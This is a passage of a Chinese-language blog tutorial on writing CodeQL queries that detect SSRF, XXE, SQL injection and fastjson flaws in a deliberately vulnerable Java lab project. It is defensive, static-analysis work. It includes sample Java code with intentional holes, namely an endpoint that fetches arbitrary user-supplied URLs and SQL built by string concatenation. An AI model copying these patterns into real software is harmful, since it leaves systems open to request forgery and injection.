class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/three&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">Three</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;url&quot;)</span> String imageUrl)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(imageUrl);</span><br><span class=\"line\">        <span class=\"type\">OkHttpClient</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>();</span><br><span class=\"line\">        com.squareup.okhttp.<span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">com</span>.squareup.okhttp.Request.Builder().get().url(url).build();</span><br><span class=\"line\">        <span class=\"type\">Call</span> <span class=\"variable\">call</span> <span class=\"operator\">=</span> client.newCall(request);</span><br><span class=\"line\">        <span class=\"type\">Response</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> call.execute();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response.toString();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException var1) &#123;</span><br><span class=\"line\">        System.out.println(var1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>com.squareup.okhttp.Request request &#x3D; new com.squareup.okhttp.Request.Builder().get().url(url).build();</p>\n<p>这种请求相对更复杂，因此需要自行构造规则。在这一条 ql 的语句当中有两个关键的定位锚点，一个是<code>url(url)</code>，一个是 <code>build()</code>，<code>url()</code> 确定是否引入污点，<code>build()</code> 确定sink的位置。结合这两者，进行检测 ql 的构造。先看一下这个的语法树AST。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png\"  alt=\"image-20241130014216314\" lazyload></a></p>\n<p>这种链式结构调用在语法树中是包含的关系，当获取到最外层的 MethodAccess 时，可以使用 <code>getAChildExpr()</code> 方法返回其子语句，使用 <code>getAChildExpr+()</code> 可以递归返回全部子语句。结合前面说到的两个关键定位锚点，进行如下代码构造</p>\n<p>最终。效果。7-20 行 ，56 行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\">MethodAccess <span class=\"title function_\">url</span><span class=\"params\">(MethodAccess ma,DataFlow::Node node)</span>&#123;</span><br><span class=\"line\">  exists( MethodAccess mc | mc = ma.getAChildExpr()| <span class=\"keyword\">if</span> mc.getCallee().hasName(<span class=\"string\">&quot;url&quot;</span>) and mc.getArgument(<span class=\"number\">0</span>) = node.asExpr() <span class=\"type\">then</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mc <span class=\"keyword\">else</span> result = url(mc,node)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MethodAccess <span class=\"title function_\">m</span><span class=\"params\">(DataFlow::Node node)</span>&#123;</span><br><span class=\"line\">  exists(</span><br><span class=\"line\">      MethodAccess ma | ma.getCallee().hasName(<span class=\"string\">&quot;build&quot;</span>) and ma.getCallee().getDeclaringType().hasName(<span class=\"string\">&quot;Builder&quot;</span>) |result = url(ma,node)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">  TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">  StringValue()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">    <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  SSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;first_modifySSRF&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node source)</span> &#123;</span><br><span class=\"line\">      source <span class=\"keyword\">instanceof</span> RemoteFlowSource and</span><br><span class=\"line\">      <span class=\"comment\">// Exclude results of remote HTTP requests: fetching something else based on that result</span></span><br><span class=\"line\">      <span class=\"comment\">// is no worse than following a redirect returned by the remote server, and typically</span></span><br><span class=\"line\">      <span class=\"comment\">// we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span></span><br><span class=\"line\">      not source.asExpr().(MethodAccess).getCallee() <span class=\"keyword\">instanceof</span> UrlConnectionGetInputStreamMethod</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      sink <span class=\"keyword\">instanceof</span> RequestForgerySink or  </span><br><span class=\"line\">      <span class=\"comment\">//sink = URL对象</span></span><br><span class=\"line\">      exists (m(sink))</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">XXEVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  XXEVulConfig()&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;XXEVulConfig&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">      src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      exists(Method method, MethodAccess call|</span><br><span class=\"line\">          method.hasName(<span class=\"string\">&quot;parse&quot;</span>) and</span><br><span class=\"line\">          call.getMethod() = method and</span><br><span class=\"line\">          sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">          )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where xxeVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n","excerpt":"","more":"<p>不会的类要积极的去 CodeQL standard libraries 里面翻看。然后多积累，多记录。</p>\n<h1 id=\"构建数据库\"><a href=\"#构建数据库\" class=\"headerlink\" title=\"构建数据库\"></a>构建数据库</h1><p>项目地址 <a href=\"https://github.com/l4yn3/micro_service_seclab\">https://github.com/l4yn3/micro_service_seclab</a></p>\n<p><code>codeql database create ~/xxxxxx/micro-service-seclab-database  --language=&quot;java&quot;  --command=&quot;mvn clean package -Dmaven.test.skip=true&quot; --source-root=./micro-service-seclab/</code></p>\n<p><code>codeql database create D:\\codeqls\\CodeQL-Practice --language=&quot;java&quot; --source-root=D:\\codeqls\\micro_service_seclab --command=&quot;mvn clean package -Dmaven.test.skip=true&quot;</code></p>\n<h1 id=\"查看sql注入的点\"><a href=\"#查看sql注入的点\" class=\"headerlink\" title=\"查看sql注入的点\"></a>查看sql注入的点</h1><blockquote>\n<p> <code>RemoteFlowSource</code>   : A data flow source of remote user input.</p>\n</blockquote>\n<p><a href=\"https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html\">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html</a></p>\n<p>比如下面这个</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/one&quot;)</span>    </span><br><span class=\"line\"><span class=\"keyword\">public</span> List&lt;Student&gt; <span class=\"title function_\">one</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> indexLogic.getStudent(username);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">VulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">     VulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SqlInjectionConfig&quot;</span>&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call |</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;query&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where config.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h1><p>在开始下面的这些之前。可以先来一个测试案例，然后看看官方的standard libraries 感受一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"> </span><br><span class=\"line\">from Method method ,MethodAccess call</span><br><span class=\"line\">where call.getMethod() = method</span><br><span class=\"line\">select method,call,call.getArgument(<span class=\"number\">0</span>),call.getArgument(<span class=\"number\">0</span>).getType()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"删除int类型参数\"><a href=\"#删除int类型参数\" class=\"headerlink\" title=\"删除int类型参数\"></a>删除int类型参数</h1><p>这个方法的参数类型是 <code>List&lt;Long&gt;</code>，不会存在注入漏洞。<br>这说明我们的规则里，对于 <code>List&lt;Long&gt;</code> ，甚至 <code>List&lt;Integer&gt;</code> 类型都会产生误报，source 误把这种类型的参数涵盖了。<br>我们需要采用 <code>isSanitizer</code> 来消除这种情况。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png\"  alt=\"image-20241129140751142\" lazyload></a></p>\n<p>三个类对应的类型如下</p>\n<p>PrimitiveType   &gt; <code>boolean</code>, <code>byte</code>, <code>short</code>, <code>char</code>, <code>int</code>, <code>long</code>, <code>float</code>, and <code>double</code>.</p>\n<p>BoxedType  &gt; <code>Boolean</code>, <code>Byte</code>, <code>Short</code>, <code>Character</code>, <code>Integer</code>, <code>Long</code>, <code>Float</code>, and <code>Double</code>.</p>\n<p>NumberType &gt;  A (reflexive, transitive) subtype of <code>java.lang.Number</code>.</p>\n<p>ParameterizedType 这个类，官方的一些解释。</p>\n<blockquote>\n<p>A parameterized type is an instantiation of a generic type(泛型类), where each formal type variable has been replaced with a type argument.</p>\n<p>For example, <code>List&lt;Number&gt;</code> is a parameterization of the generic type <code>List&lt;E&gt;</code>, where <code>E</code> is a type parameter.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">override predicate <span class=\"title function_\">isSanitizer</span><span class=\"params\">(DataFlow::Node node)</span> &#123;</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> NumberType or</span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(ParameterizedType pt| </span></span><br><span class=\"line\"><span class=\"params\">        node.getType()</span> = pt and pt.getTypeArgument(<span class=\"number\">0</span>) <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">     )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"解决漏报\"><a href=\"#解决漏报\" class=\"headerlink\" title=\"解决漏报\"></a>解决漏报</h1><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> List&lt;Student&gt; <span class=\"title function_\">getStudentWithOptional</span><span class=\"params\">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">sqlWithOptional</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>假如 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 <code>username</code> 流转到<code>username.get()</code>，这样 <code>username.get()</code> 就变得可控了。这样应该就能识别出这个注入漏洞了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">isTaintedString</span><span class=\"params\">(Expr expSrc, Expr expDest)</span> &#123;</span><br><span class=\"line\">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class=\"line\">        expSrc = call1.getArgument(<span class=\"number\">0</span>) <span class=\"type\">and</span> <span class=\"variable\">expDest</span> <span class=\"operator\">=</span> call and call.getMethod() = method</span><br><span class=\"line\">        and method.hasName(<span class=\"string\">&quot;get&quot;</span>) and method.getDeclaringType().toString() = <span class=\"string\">&quot;Optional&lt;String&gt;&quot;</span></span><br><span class=\"line\">        and call1.getArgument(<span class=\"number\">0</span>).getType().toString() = <span class=\"string\">&quot;Optional&lt;String&gt;&quot;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">VulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">     VulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SqlInjectionConfig&quot;</span>&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call |</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;query&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)  <span class=\"comment\">// sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSanitizer</span><span class=\"params\">(DataFlow::Node node)</span> &#123;</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">        node.getType() <span class=\"keyword\">instanceof</span> NumberType or</span><br><span class=\"line\">        <span class=\"title function_\">exists</span><span class=\"params\">(ParameterizedType pt| </span></span><br><span class=\"line\"><span class=\"params\">            node.getType()</span> = pt and pt.getTypeArgument(<span class=\"number\">0</span>) <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">         )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;</span><br><span class=\"line\">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where config.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h1><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FastjsonVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">    FastjsonVulConfig() 